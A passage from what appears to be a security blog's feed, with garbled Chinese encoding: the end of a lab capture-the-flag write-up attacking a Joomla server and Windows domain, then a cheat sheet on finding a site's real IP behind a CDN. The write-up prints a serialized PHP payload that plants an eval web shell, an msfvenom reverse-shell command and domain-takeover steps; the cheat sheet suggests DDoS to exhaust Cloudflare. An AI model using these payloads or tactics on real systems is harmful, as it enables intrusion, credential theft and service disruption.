class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;feed_url = <span class="string">"system('echo \'ZWNobyAiPD9waHAgZXZhbChcJF9QT1NUW2FdKT8+IiA+IC9ob21lL3d3d3Jvb3QvZGVmYXVsdC8xLnBocA==\'| base64 -d | bash');JFactory::getConfig();exit;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache_name_function = <span class="string">"assert"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sanitize = <span class="keyword">new</span> JDatabaseDriverMysql();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> JDatabaseDriverMysqli();</span><br><span class="line">$ser = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $data = str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $ser);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·åï¼š</span><br><span class="line">\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span></span><br><span class="line"></span><br><span class="line">å¯†ç ï¼š</span><br><span class="line">MYP<span class="string">";s:2:"</span>HS<span class="string">";O:21:"</span>JDatabaseDriverMysqli<span class="string">":4:&#123;s:5:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>xx<span class="string">";O:17:"</span>JSimplepieFactory<span class="string">":0:&#123;&#125;s:13:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>connection<span class="string">";i:1;s:21:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>disconnectHandlers<span class="string">";a:1:&#123;i:0;a:2:&#123;i:0;O:9:"</span>SimplePie<span class="string">":3:&#123;s:8:"</span>sanitize<span class="string">";O:20:"</span>JDatabaseDriverMysql<span class="string">":0:&#123;&#125;s:19:"</span>cache_name_function<span class="string">";s:6:"</span>assert<span class="string">";s:8:"</span>feed_url<span class="string">";s:149:"</span>system(<span class="string">'echo \'ZWNobyAiPD9waHAgZXZhbChcJF9QT1NUW2FdKT8+IiA+IC9ob21lL3d3d3Jvb3QvZGVmYXVsdC8xLnBocA==\'| base64 -d | bash'</span>);JFactory::getConfig();<span class="keyword">exit</span>;<span class="string">";&#125;i:1;s:4:"</span>init<span class="string">";&#125;&#125;s:6:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>obj<span class="string">";N;&#125;</span></span><br></pre></td></tr></table></figure><p>antswordè¿æ¥åï¼Œåœ¨/tmpç›®å½•ä¸Šä¼ æˆ‘ä»¬ç”Ÿæˆçš„msfæœ¨é©¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.21.12 LPORT=6666 -f elf &gt; shell2.elf</span><br></pre></td></tr></table></figure><p><img src="/iSoonLab.org Write-up/image-20191201004320825.png" alt="image-20191201004320825"></p><p>æ‹¿åˆ°shellåï¼ŒæŸ¥çœ‹uname</p><p><img src="/iSoonLab.org Write-up/image-20191201004824374.png" alt="image-20191201004824374"></p><p>å†…æ ¸ç‰ˆæœ¬æ¯”è¾ƒä½çš„æ¡Œé¢ç‰ˆæœ¬ï¼Œå­˜åœ¨CVE-2019-13272</p><p>EXPéœ€è¦æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶: </p><ol><li>å†…æ ¸ç‰ˆæœ¬ &lt; 5.1.17 ä¸”ä¸ºæ¡Œé¢ç‰ˆ</li><li>å­˜åœ¨/home/\<user></user></li><li>äº¤äº’å¼shell</li></ol><p><img src="/iSoonLab.org Write-up/image-20191201005023629.png" alt="image-20191201005023629"></p><p>æˆåŠŸæ‹¿åˆ°ç¬¬äºŒä¸ªflag</p><h2 id="Backup-sub-iSoonLab-org"><a href="#Backup-sub-iSoonLab-org" class="headerlink" title="Backup.sub.iSoonLab.org"></a>Backup.sub.iSoonLab.org</h2><p>å›è¿‡æ¥çœ‹webç•Œé¢çš„æç¤º</p><p><img src="/iSoonLab.org Write-up/image-20191201005203360.png" alt="image-20191201005203360"></p><p>æ”¾å‡ºäº†ä¸‹ä¸€æ­¥çš„hintï¼ŒæŸ¥çœ‹å·²ç»å®‰è£…çš„è½¯ä»¶å’Œpythonç¬¬ä¸‰æ–¹åº“</p><p><img src="/iSoonLab.org Write-up/image-20191201005355412.png" alt="image-20191201005355412"></p><p>ä¸‰æ¡æ€è·¯ï¼š</p><ol><li><p>åˆ©ç”¨impacketå’Œarpspoofè¿›è¡Œä¸­é—´äººæ”»å‡»</p></li><li><p>åœ¨æœ¬æœºä¸Šè¿›è¡Œä¿¡æ¯æœé›†ï¼Œå¯»æ‰¾åˆ°åŸŸæˆå‘˜æœºå™¨çš„è·¯å­</p></li><li>ç³»ç»Ÿæ¼æ´ -&gt; ms17010 .etc </li></ol><ol><li><p>ä¸­é—´äººæ”»å‡»ä½¿ç”¨ms15-014 å’Œ ms15-011 è¿›è¡Œç»„ç­–ç•¥åŠ«æŒï¼Œæ‹¿ä¸‹åŸŸæˆå‘˜æœºå™¨</p></li><li><p>ç¿»æœºå™¨çš„æ—¥å¿—</p></li><li>æœ‰dayä¸Šdayï½ </li></ol><p>### </p><p>ç®€å•æ–¹æ³•:</p><p>é€šè¿‡<code>.bash_history</code>æ‹¿åˆ°mountå‘½ä»¤ï¼Œå­˜æœ‰æ˜æ–‡å¯†ç ï¼Œ é€šè¿‡<code>exploit/windows/smb/psexec</code>å³å¯æ‹¿åˆ°ç›®æ ‡æœºå™¨NT/SYSTEM</p><p><img src="/iSoonLab.org Write-up/image-20191201013130568.png" alt="image-20191201013130568"></p><p>ä¸­é—´äººæµ‹è¯•ä¹Ÿæ˜¯å¯è¡Œçš„ï¼Œä½¿ç”¨MS15-011åŠ«æŒç»„ç­–ç•¥ï¼Œåªæ˜¯éœ€è¦ç­‰å¾…ç»„ç­–ç•¥ç”Ÿæ•ˆ (é»˜è®¤90åˆ†é’Ÿ)</p><p>&lt;æ‡’ç‹—ä¸æƒ³æˆªå›¾äº†&gt;</p><h2 id="subdc-iSoonLab-org"><a href="#subdc-iSoonLab-org" class="headerlink" title="subdc.iSoonLab.org"></a>subdc.iSoonLab.org</h2><p>åœ¨backupæœºå­ä¸Šçš„C:\Backupç¿»åˆ°äº†æ³¨å†Œè¡¨çš„å­˜æ¡£</p><p><img src="/iSoonLab.org Write-up/image-20191201014315000.png" alt="image-20191201014315000"></p><p>ä¸‹è½½ä¸‹æ¥ä½¿ç”¨secretsdumpè¿›è¡Œdump</p><p><img src="/iSoonLab.org Write-up/image-20191201014547133.png" alt="image-20191201014547133"></p><p>æ‹¿åˆ°æœåŠ¡è´¦æˆ·åï¼Œç”¨æ¥æ„é€ ç™½é“¶ç¥¨æ®ï¼Œæ”»å‡»subdc.sub.iSoonLab.org<br>ï¼ˆMS14068ä¹Ÿå¯ï¼‰</p><p><img src="/iSoonLab.org Write-up/image-20191201015913467.png" alt="image-20191201015913467"></p><p>(æ³¨æ„å¿…é¡»å…³é—­Linux2ä¸­çš„arpspoof)</p><p><img src="/iSoonLab.org Write-up/image-20191201020209077.png" alt="image-20191201020209077"></p><p>ç¬¬å››ä¸ªflagåˆ°æ‰‹ï½ï½</p><h2 id="DC-iSoonLab-org"><a href="#DC-iSoonLab-org" class="headerlink" title="DC.iSoonLab.org"></a>DC.iSoonLab.org</h2><p>æœ€åå°±å¾ˆç®€å•å•¦ï¼Œå­çˆ¶åŸŸä¸­å¸¸è§çš„åŒå‘ä¿¡ä»»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ ä¿¡ä»»ç¥¨æ®æ¥è¿›è¡Œæ”»å‡»</p><p>åˆ©ç”¨ä¿¡ä»»ç¥¨æ® </p><p><a href="http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/</a> </p><p>è¿™é‡Œæœ‰ä¸€ç‚¹å°é—®é¢˜: å½“æŒ‡å®škrbtgtè´¦æˆ·æ—¶ï¼Œå› ä¸ºå­çˆ¶åŸŸä¸­å­˜åœ¨ä¸¤ä¸ªkrbtgtè´¦æˆ·ï¼ŒDCsyncè½¬å‚¨æ—¶å¯èƒ½çˆ†<code>NOT_UNIQUE</code>ï¼Œå¯ä»¥ä½¿ç”¨/allè§£å†³ </p><p>åˆ©ç”¨dcsync è½¬å‚¨å­åŸŸçš„æ‰€æœ‰hash </p><p><img src="/iSoonLab.org Write-up/4624EF12-0825-4134-BFFE-AF47CF9CA4FB.png" alt="4624EF12-0825-4134-BFFE-AF47CF9CA4FB"></p><p><img src="/iSoonLab.org Write-up/04C766D7-B915-48FE-A381-3CA4DD18727D.png" alt="04C766D7-B915-48FE-A381-3CA4DD18727D"></p><p>ä½¿ç”¨/Ptt è¿›è¡Œä¿¡ä»»ç¥¨æ®ä¼ é€’å³å¯</p><p><img src="/iSoonLab.org Write-up/2A7C786C-5AA4-4AE2-8DE1-755DBFDE9382.png" alt="2A7C786C-5AA4-4AE2-8DE1-755DBFDE9382"></p><p>æ‹¿åˆ°åŸŸæ§æƒé™ï¼Œflagåœ¨C:\Users\Administraotr\flag.txtä¸­</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-12-12 14:32:22&lt;br&gt;&lt;img src=&quot;/wallpaper/[30125]16347313.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;
      
    
    </summary>
    
      <category term="Write-up" scheme="http://patrilic.top/categories/Write-up/"/>
    
    
      <category term="iSoonLab.org" scheme="http://patrilic.top/tags/iSoonLab-org/"/>
    
  </entry>
  
  <entry>
    <title>Bypass CDN å¯»æ‰¾çœŸå®IP</title>
    <link href="http://patrilic.top/2019/10/09/Bypass%20CDN%20%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9EIP_1/"/>
    <id>http://patrilic.top/2019/10/09/Bypass CDN å¯»æ‰¾çœŸå®IP_1/</id>
    <published>2019-10-09T05:12:49.000Z</published>
    <updated>2019-10-31T15:51:16.775Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-10-09 13:12:49<br><img src="/wallpaper/futuristic.jpeg" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ä¸ªäººè§‰å¾—ï¼Œç»•è¿‡CDNå»å¯»æ‰¾ä¸»æœºçš„çœŸå®ipï¼Œæ›´å®¹æ˜“èƒ½å¯»æ‰¾åˆ°ä¼ä¸šç½‘ç»œçš„è–„å¼±åœ°å¸¦ï¼Œæ‰€ä»¥Bypass CDNä¹Ÿå°±å˜æˆäº†è‡³å…³é‡è¦çš„ä¸€ç‚¹</p><h2 id="0x01-å¸¸è§Bypassæ–¹æ³•"><a href="#0x01-å¸¸è§Bypassæ–¹æ³•" class="headerlink" title="0x01 å¸¸è§Bypassæ–¹æ³•"></a>0x01 å¸¸è§Bypassæ–¹æ³•</h2><h3 id="å­åŸŸåæœé›†"><a href="#å­åŸŸåæœé›†" class="headerlink" title="å­åŸŸåæœé›†"></a>å­åŸŸåæœé›†</h3><p>ç”±äºæˆæœ¬é—®é¢˜ï¼Œå¯èƒ½æŸäº›å‚å•†å¹¶ä¸ä¼šå°†æ‰€æœ‰çš„å­åŸŸåéƒ½éƒ¨ç½²CDNï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬èƒ½å°½é‡çš„æœé›†å­åŸŸåï¼Œæˆ–è®¸å¯ä»¥æ‰¾åˆ°ä¸€äº›æ²¡æœ‰éƒ¨ç½²CDNçš„å­åŸŸåï¼Œæ‹¿åˆ°æŸäº›æœåŠ¡å™¨çš„çœŸå®ip/æ®µ</p><p>ç„¶åå…³äºå­åŸŸåæœé›†çš„æ–¹å¼å¾ˆå¤šï¼Œå°±ä¸ä¸€ä¸€ä»‹ç»äº†ï¼Œæˆ‘å¹³æ—¶ä¸»è¦æ˜¯ä»è¿™å‡ ä¸ªæ–¹é¢æœé›†å­åŸŸåï¼š</p><ol><li>SSLè¯ä¹¦</li><li>çˆ†ç ´</li><li>Google Hacking</li><li>åŒé‚®ç®±æ³¨å†Œäºº</li><li>DNS åŸŸä¼ é€</li><li>é¡µé¢JSæœé›†</li><li>ç½‘ç»œç©ºé—´å¼•æ“</li></ol><p>å·¥å…·ä¹Ÿæœ‰å¾ˆå¤šå‰å®³çš„ï¼Œå¹³æ—¶æˆ‘ä¸€èˆ¬ä½¿ç”¨ OneForALL + ESD + JSfinder æ¥è¿›è¡Œæœé›†</p><p>ï¼ˆESDå¯ä»¥åŠ è½½layerçš„å­—å…¸ï¼Œå¾ˆå¥½ç”¨ï¼‰</p><h3 id="æŸ¥è¯¢DNSå†å²è§£æè®°å½•"><a href="#æŸ¥è¯¢DNSå†å²è§£æè®°å½•" class="headerlink" title="æŸ¥è¯¢DNSå†å²è§£æè®°å½•"></a>æŸ¥è¯¢DNSå†å²è§£æè®°å½•</h3><p>å¸¸å¸¸æœåŠ¡å™¨åœ¨è§£æåˆ°CDNæœåŠ¡å‰ï¼Œä¼šè§£æçœŸå®ipï¼Œå¦‚æœå†å²æœªåˆ é™¤ï¼Œå°±å¯èƒ½æ‰¾åˆ°<br><img src="/Bypass CDN å¯»æ‰¾çœŸå®IP.resources/9E7A020F-400D-4098-95A0-890D6ECF58B5.png" alt="aa49a0dae035183756bc9b7c574f7d1d"><br>å¸¸ç”¨ç½‘ç«™ï¼š<br><a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a><br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a><br><a href="http://www.17ce.com/" target="_blank" rel="noopener">http://www.17ce.com/</a><br><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a><br><a href="https://securitytrails.com/" target="_blank" rel="noopener">https://securitytrails.com/</a><br><a href="http://www.ip138.com/" target="_blank" rel="noopener">http://www.ip138.com/</a><br><a href="https://github.com/vincentcox/bypass-firewalls-by-DNS-history" target="_blank" rel="noopener">https://github.com/vincentcox/bypass-firewalls-by-DNS-history</a></p><h3 id="MXè®°å½•ï¼ˆé‚®ä»¶æ¢æµ‹ï¼‰"><a href="#MXè®°å½•ï¼ˆé‚®ä»¶æ¢æµ‹ï¼‰" class="headerlink" title="MXè®°å½•ï¼ˆé‚®ä»¶æ¢æµ‹ï¼‰"></a>MXè®°å½•ï¼ˆé‚®ä»¶æ¢æµ‹ï¼‰</h3><p>è¿™ä¸ªå¾ˆç®€å•ï¼Œå¦‚æœç›®æ ‡ç³»ç»Ÿæœ‰å‘ä»¶åŠŸèƒ½ï¼Œé€šå¸¸åœ¨æ³¨å†Œç”¨æˆ·/æ‰¾å›å¯†ç ç­‰åœ°æ–¹<img src="/Bypass CDN å¯»æ‰¾çœŸå®IP.resources/30801098-D5BB-4C46-83CB-DF4313C5D54E.png" alt="8aa01bd3ebc5fea8c50bfcf182df44d7"></p><h3 id="SSLè¯ä¹¦æ¢æµ‹"><a href="#SSLè¯ä¹¦æ¢æµ‹" class="headerlink" title="SSLè¯ä¹¦æ¢æµ‹"></a>SSLè¯ä¹¦æ¢æµ‹</h3><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç©ºé—´å¼•æ“è¿›è¡ŒSSLè¯ä¹¦æ¢æµ‹</p><blockquote><p>443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p></blockquote><p><img src="/Bypass CDN å¯»æ‰¾çœŸå®IP.resources/FA2E7635-76E4-43A3-B724-C782E3C08304.png" alt="cbd4dfce974be17192c5d3991bcb9ceb"><br>443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p><p>å†æ”¾ä¸€ä¸ªæœé›†è¯ä¹¦çš„ç½‘ç«™<a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh</a></p><p>ä¸€ä¸ªå°è„šæœ¬ï¼Œå¯ä»¥å¿«é€Ÿæœé›†è¯ä¹¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019-10-08 22:51</span></span><br><span class="line"><span class="comment"># @Author  : Patrilic</span></span><br><span class="line"><span class="comment"># @FileName: SSL_subdomain.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">TIME_OUT = <span class="number">60</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_SSL</span><span class="params">(domain)</span>:</span></span><br><span class="line">    domains = []</span><br><span class="line">    url = <span class="string">'https://crt.sh/?q=%25.&#123;&#125;'</span>.format(domain)</span><br><span class="line">    response = requests.get(url,timeout=TIME_OUT)</span><br><span class="line">    <span class="comment"># print(response.text)</span></span><br><span class="line">    ssl = re.findall(<span class="string">"&lt;TD&gt;(.*?).&#123;&#125;&lt;/TD&gt;"</span>.format(domain),response.text)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ssl:</span><br><span class="line">        i += <span class="string">'.'</span> + domain</span><br><span class="line">        domains.append(i)</span><br><span class="line">    print(domains)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    get_SSL(<span class="string">"baidu.com"</span>)</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§æ–¹å¼ï¼Œå°±æ˜¯æœé›†SSLè¯ä¹¦Hashï¼Œç„¶åéå†ipå»æŸ¥è¯¢è¯ä¹¦hashï¼Œå¦‚æœåŒ¹é…åˆ°ç›¸åŒçš„ï¼Œè¯æ˜è¿™ä¸ªipå°±æ˜¯é‚£ä¸ª åŸŸååŒæ ¹è¯ä¹¦çš„æœåŠ¡å™¨çœŸå®ip</p><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯éå†0.0.0.0/0:443ï¼Œé€šè¿‡ipè¿æ¥httpsæ—¶ï¼Œä¼šæ˜¾ç¤ºè¯ä¹¦</p><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç”¨censysç­‰å¼•æ“<br><img src="/Bypass CDN å¯»æ‰¾çœŸå®IP.resources/82C66A85-0718-4D35-BF78-4BC6F8D66137.png" alt="88c410f42542b4d8b7387ca70ca55e68"></p><h3 id="åè¿œåœ°åŒºæœåŠ¡å™¨è®¿é—®"><a href="#åè¿œåœ°åŒºæœåŠ¡å™¨è®¿é—®" class="headerlink" title="åè¿œåœ°åŒºæœåŠ¡å™¨è®¿é—®"></a>åè¿œåœ°åŒºæœåŠ¡å™¨è®¿é—®</h3><p>åœ¨åè¿œåœ°åŒºçš„æœåŠ¡å™¨è®¿é—®æ—¶ï¼Œå¯èƒ½ä¸ä¼šè®¿é—®åˆ°CDNèŠ‚ç‚¹ï¼Œè€Œæ˜¯ç›´æ¥è®¿é—®æœåŠ¡å™¨çœŸå®ip</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æä¸€ä¸ªåè¿œåœ°åŒºçš„ä»£ç†æ± ï¼Œæ¥è®¿é—®ç›®æ ‡åŸŸåï¼Œæœ‰æ¦‚ç‡å°±å¯ä»¥æ‹¿åˆ°çœŸå®ip</p><p>ä¹Ÿå°±æ˜¯å¹³å¸¸è¯´çš„å¤šåœ°Ping<br><img src="/Bypass CDN å¯»æ‰¾çœŸå®IP.resources/B6C9E83C-9951-4397-9929-995ABDA0F31A.png" alt="766172367254161b3f5a2d0e44e0174d"></p><h3 id="favicon-hashåŒ¹é…"><a href="#favicon-hashåŒ¹é…" class="headerlink" title="favicon_hashåŒ¹é…"></a>favicon_hashåŒ¹é…</h3><p>åˆ©ç”¨shodançš„<strong>http.favicon.hash</strong>è¯­æ³•ï¼Œæ¥åŒ¹é…iconçš„hashå€¼</p><p>ç›´æ¥æ¨<a href="https://github.com/Ridter/get_ip_by_ico/blob/master/get_ip_by_ico.py" target="_blank" rel="noopener">https://github.com/Ridter/get_ip_by_ico/blob/master/get_ip_by_ico.py</a></p><p><a name="iWsmO"></a></p><h3 id="CloudFlare-Bypass"><a href="#CloudFlare-Bypass" class="headerlink" title="CloudFlare Bypass"></a>CloudFlare Bypass</h3><p>å…è´¹ç‰ˆçš„cfï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡DDOSæ¥æ¶ˆè€—å¯¹æ–¹çš„æµé‡ï¼Œåªéœ€è¦æŠŠæµé‡æ‰“å…‰ï¼Œå°±ä¼šå›æ»šåˆ°åŸå§‹ip</p><p>è¿˜æœ‰åˆ©ç”¨cloudflareçš„æ”¹hostè¿”å›ç¤ºä¾‹:<br><a href="https://blog.detectify.com/2019/07/31/bypassing-cloudflare-waf-with-the-origin-server-ip-address/" target="_blank" rel="noopener">https://blog.detectify.com/2019/07/31/bypassing-cloudflare-waf-with-the-origin-server-ip-address/</a><br>é‡Œé¢ç»™äº†è¯¦ç»†çš„ä»‹ç»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡HOSTæ¥åˆ¤æ–­æ˜¯å¦æ˜¯çœŸå®ip<br>å…·ä½“çœ‹æ–‡ç« å³å¯</p><p><a name="gmuNS"></a></p><h3 id="å¥‡ç‰¹çš„ping"><a href="#å¥‡ç‰¹çš„ping" class="headerlink" title="å¥‡ç‰¹çš„ping"></a>å¥‡ç‰¹çš„ping</h3><p>æ¯”å¦‚å¯èƒ½æœ‰äº›åœ°æ–¹ï¼Œä½¿ç”¨çš„CDNéƒ½æ˜¯ä»¥<a href="http://www.xxx.edu.cnï¼Œä¾‹å¦‚www.cuit.edu.cn,www.jwc.cuit.edu.cn" target="_blank" rel="noopener">www.xxx.edu.cnï¼Œä¾‹å¦‚www.cuit.edu.cn,www.jwc.cuit.edu.cn</a></p><p>å¯èƒ½å»æ‰å‰ç¼€çš„wwwï¼Œå°±å¯èƒ½ç»•è¿‡CDNäº†ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯ç±»ä¼¼äºApache VirtualHost</p><p>å¯å‚è€ƒ<a href="https://httpd.apache.org/docs/2.4/en/vhosts/examples.html" target="_blank" rel="noopener">https://httpd.apache.org/docs/2.4/en/vhosts/examples.html</a></p><p>ä¾‹å¦‚ï¼š<br><img src="/Bypass CDN å¯»æ‰¾çœŸå®IP.resources/D368AA5E-A66E-46A8-9E96-7B439AB7E059.png" alt="94f6e57f5f9c038766a278c76f46ce30"></p><p>æˆ‘è¿™é‡Œå…¶å®æ˜¯pingäº†<a href="http://www.xxx.gov.cnå’Œxxx.gov.cn" target="_blank" rel="noopener">www.xxx.gov.cnå’Œxxx.gov.cn</a></p><p>è¿™æ ·å°±å¯ä»¥ç»•è¿‡CDNçš„æ£€æµ‹</p><p><a name="kroXV"></a></p><h3 id="åˆ©ç”¨è€åŸŸå"><a href="#åˆ©ç”¨è€åŸŸå" class="headerlink" title="åˆ©ç”¨è€åŸŸå"></a>åˆ©ç”¨è€åŸŸå</h3><p>åœ¨æ¢æ–°åŸŸåæ—¶ï¼Œå¸¸å¸¸å°†CDNéƒ¨ç½²åˆ°æ–°çš„åŸŸåä¸Šï¼Œè€Œè€åŸŸåç”±äºæ²¡è¿‡æœŸï¼Œå¯èƒ½æœªä½¿ç”¨CDNï¼Œç„¶åå°±å¯ä»¥ç›´æ¥è·å–æœåŠ¡å™¨çœŸå®ipã€‚</p><p>ä¾‹å¦‚patrilic.top &gt; patrilic.com<br>åŸŸåæ›´æ–°æ—¶ï¼Œå¯èƒ½è€åŸŸååŒæ—¶è§£æåˆ°çœŸå®æœåŠ¡å™¨ï¼Œä½†æ˜¯æ²¡æœ‰éƒ¨ç½²CDN</p><p>è¿™ä¸ªå¯ä»¥é€šè¿‡æœé›†åŸŸåå¤‡æ¡ˆçš„é‚®ç®±å»åæŸ¥ï¼Œå¯èƒ½ä¼šæœ‰æ„å¤–æ”¶è·</p><h3 id="æš´åŠ›åŒ¹é…"><a href="#æš´åŠ›åŒ¹é…" class="headerlink" title="æš´åŠ›åŒ¹é…"></a>æš´åŠ›åŒ¹é…</h3><p>æ‰¾åˆ°ç›®æ ‡æœåŠ¡å™¨IPæ®µåï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œæš´åŠ›åŒ¹é… ï¼Œä½¿ç”¨masscanæ‰«æHTTP bannerï¼Œç„¶ååŒ¹é…åˆ°ç›®æ ‡åŸŸåçš„ç›¸åŒbanner</p><h3 id="DDos-ç¤¾å·¥CDNå¹³å°ç­‰"><a href="#DDos-ç¤¾å·¥CDNå¹³å°ç­‰" class="headerlink" title="DDos/ç¤¾å·¥CDNå¹³å°ç­‰"></a>DDos/ç¤¾å·¥CDNå¹³å°ç­‰</h3><h2 id="0x02-å…¶ä»–æ–¹æ³•"><a href="#0x02-å…¶ä»–æ–¹æ³•" class="headerlink" title="0x02 å…¶ä»–æ–¹æ³•"></a>0x02 å…¶ä»–æ–¹æ³•</h2><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p><img src="/Bypass CDN å¯»æ‰¾çœŸå®IP.resources/6CC86789-CDCC-47CA-9940-744FBC32274E.png" alt="cd01f0e2811d6b9828927bfe6c57f8b3"></p><h3 id="ssrfï¼Œæ–‡ä»¶ä¸Šä¼ ç­‰æ¼æ´"><a href="#ssrfï¼Œæ–‡ä»¶ä¸Šä¼ ç­‰æ¼æ´" class="headerlink" title="ssrfï¼Œæ–‡ä»¶ä¸Šä¼ ç­‰æ¼æ´"></a>ssrfï¼Œæ–‡ä»¶ä¸Šä¼ ç­‰æ¼æ´</h3><p>ç•¥..</p><p><a name="gEBoP"></a></p><h2 id="0x03-å‚è€ƒé“¾æ¥ğŸ”—"><a href="#0x03-å‚è€ƒé“¾æ¥ğŸ”—" class="headerlink" title="0x03 å‚è€ƒé“¾æ¥ğŸ”—"></a>0x03 å‚è€ƒé“¾æ¥ğŸ”—</h2><p><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">https://github.com/shmilylty/OneForAll</a><br><a href="https://github.com/FeeiCN/ESD" target="_blank" rel="noopener">https://github.com/FeeiCN/ESD</a><br><a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a><br><a href="https://github.com/AI0TSec/blog/issues/8" target="_blank" rel="noopener">https://github.com/AI0TSec/blog/issues/8</a><br><a href="https://www.4hou.com/tools/8251.html" target="_blank" rel="noopener">https://www.4hou.com/tools/8251.html</a><br><a href="https://www.freebuf.com/sectool/112583.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/112583.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-10-09 13:12:49&lt;br&gt;&lt;img src=&quot;/wallpaper/futuristic.jpeg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00
      
    
    </summary>
    
      <category term="Pentest Cheat Sheet" scheme="http://patrilic.top/categories/Pentest-Cheat-Sheet/"/>
    
    
      <category term="Bypass CDN" scheme="http://patrilic.top/tags/Bypass-CDN/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-6145  Forcepoint VPN</title>
    <link href="http://patrilic.top/2019/09/27/CVE-2019-6145%20%20Forcepoint%20VPN/"/>
    <id>http://patrilic.top/2019/09/27/CVE-2019-6145  Forcepoint VPN/</id>
    <published>2019-09-26T16:03:55.000Z</published>
    <updated>2019-09-27T06:52:31.916Z</updated>
    
